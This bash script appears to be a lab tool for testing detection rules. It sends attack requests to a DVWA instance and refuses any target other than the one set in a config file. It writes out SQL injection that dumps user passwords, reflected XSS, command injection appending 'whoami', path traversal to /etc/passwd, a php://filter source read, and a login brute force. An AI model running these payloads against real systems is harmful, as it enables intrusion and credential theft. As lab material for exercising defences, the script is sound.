#!/bin/bash
# LAB USE ONLY - target must match attack-sim/target.conf (your own EC2 instance)
# Usage: ./web-attacks.sh <target_ip> <attack_type>
# attack_type: sqli | xss | cmdi | traversal | bruteforce | all

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CONF="$SCRIPT_DIR/target.conf"
TARGET="$1"
ATTACK="$2"
LOGFILE="$SCRIPT_DIR/attack-log.txt"

if [[ ! -f "$CONF" ]]; then
    echo "Missing $CONF — copy target.conf.example to target.conf and set ALLOWED_TARGET."
    exit 1
fi
source "$CONF"

if [[ -z "$TARGET" || "$TARGET" != "$ALLOWED_TARGET" ]]; then
    echo "Refusing to run: target must exactly match ALLOWED_TARGET in target.conf ($ALLOWED_TARGET)"
    exit 1
fi

BASE="http://$TARGET/dvwa/vulnerabilities"

log() {
    echo "$(date -u +%Y-%m-%dT%H:%M:%SZ) | web-attack:$1 | target=$TARGET | user=$(whoami)" >> "$LOGFILE"
}

run_sqli() {
    log "sqli"
    curl -s "$BASE/sqli/?id=1' OR 1=1-- -&Submit=Submit" -o /dev/null
    curl -s "$BASE/sqli/?id=1' UNION SELECT user,password FROM users-- -&Submit=Submit" -o /dev/null
}

run_xss() {
    log "xss"
    curl -s "$BASE/xss_r/?name=<script>alert(1)</script>" -o /dev/null
}

run_cmdi() {
    log "cmdi"
    curl -s -d "ip=127.0.0.1;whoami&Submit=Submit" "$BASE/exec/" -o /dev/null
}

run_traversal() {
    log "traversal"
    curl -s "$BASE/fi/?page=../../../../etc/passwd" -o /dev/null
    curl -s "$BASE/fi/?page=php://filter/convert.base64-encode/resource=include.php" -o /dev/null
}

run_bruteforce() {
    # rule needs >=20 POSTs within 2 minutes
    log "web-bruteforce"
    for i in $(seq 1 25); do
        curl -s -d "username=admin&password=wrong$i&Login=Login" "$BASE/brute/" -o /dev/null
    done
}

case "$ATTACK" in
    sqli) run_sqli ;;
    xss) run_xss ;;
    cmdi) run_cmdi ;;
    traversal) run_traversal ;;
    bruteforce) run_bruteforce ;;
    all) run_sqli; run_xss; run_cmdi; run_traversal; run_bruteforce ;;
    *) echo "Usage: ./web-attacks.sh <target_ip> {sqli|xss|cmdi|traversal|bruteforce|all}"; exit 1 ;;
esac
